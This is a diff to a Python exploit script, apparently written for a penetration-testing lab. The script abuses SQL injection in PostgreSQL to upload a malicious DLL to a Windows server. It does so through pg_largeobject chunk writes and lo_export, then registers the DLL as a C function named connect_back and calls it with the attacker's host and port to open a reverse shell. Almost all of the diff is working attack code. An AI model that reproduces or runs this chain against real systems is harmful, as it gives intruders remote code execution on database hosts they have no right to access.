@@ -47,31 +47,62 @@ def main():
 	LPORT = sys.argv[2]
 	loid = 2118
 	
-	# Step 1: Create malicious DLL
+	# Step 1: Create and HEX encode malicious DLL 
+	# Reference: https://stackoverflow.com/questions/3964245/convert-file-to-hex-string-python
 	udf_filename = 'connect_back.dll'
 	with open(udf_filename, 'rb') as f:
 		content = f.read()
-		print(content)
-	return
+	udf = binascii.hexlify(content).decode('utf-8')
 
 	# Step 2A: Ensure loid is available
 	print(f"Clearing LOID {loid}")
-	command = f'SELECT lo_unlink {loid}'
+	command = f'SELECT lo_unlink ({loid})'
 	send_psql_command(ip=ip, command=command)
 
 	# Step 2: Inject query that creates large object from arbitrary file
 	print("Importing large object from win.ini")
-	command = f'\
-	SELECT lo_import($$C:\\windows\\win.ini$$, {loid}'
+	command = f'SELECT lo_import($$C:\\windows\\win.ini$$, {loid})'
 	send_psql_command(ip=ip, command=command)
 
+	chunk_size = 4096
+	for i in range(len(udf)//chunk_size+1):
+		hex_string = udf[i*chunk_size:(i+1)*chunk_size]
+		if len(hex_string) == 0: break
 
+		if i == 0:
+			# Step 3: Inject query to update page 0 of LO with first 2KB of DLL
+			print("Inject query to update page 0 of LO with first 2KB of DLL")
+			command = (
+			f"UPDATE pg_largeobject SET data=decode($${hex_string}$$,$$hex$$) "
+			f"WHERE loid={loid} AND pageno=0")
+			send_psql_command(ip=ip, command=command)
+		else:
+			# Step 4: Inject queries that insert additional pages into pg_largeobject with remainder of DLL
+			# Reference: https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql
+			print("Inject queries that insert additional pages into pg_largeobject with remainder of DLL")
+			command = (
+			f"INSERT INTO pg_largeobject (loid, pageno, data) VALUES "
+			f"({loid}, {i}, decode($${hex_string}$$, $$hex$$))")
+			send_psql_command(ip=ip, command=command)
 
-	connect_command = f'''\
-select connect_back($${LHOST}$$, {LPORT});\
-	'''
+	# Step 5: Inject query that exports DLL onto remote file system
+	print("Inject query that exports DLL onto remote file system")
+	command = f"SELECT lo_export({loid}, $$C:\\Users\\Public\\connect_back.dll$$)"
+	send_psql_command(ip=ip, command=command)
 
-	send_psql_command(ip=ip, command=connect_command)
+	# Step 6: Inject query that creates Postgres UDF with exported DLL
+	print("Inject query that creates Postgres UDF with exported DLL")
+	command =(
+	f"CREATE OR REPLACE FUNCTION connect_back(text, integer)"
+	f"RETURNS void AS $$C:\\Users\\Public\\connect_back.dll$$,"
+	f"$$connect_back$$ LANGUAGE C STRICT")
+	send_psql_command(ip=ip, command=command)
+	
+	# Step 7: Inject query that executes newly created UDF
+	print("Inject query that executes newly created UDF")
+	command = f'select connect_back($${LHOST}$$, {LPORT})'
+
+	send_psql_command(ip=ip, command=command)
 if __name__ == '__main__':
 	main()
 
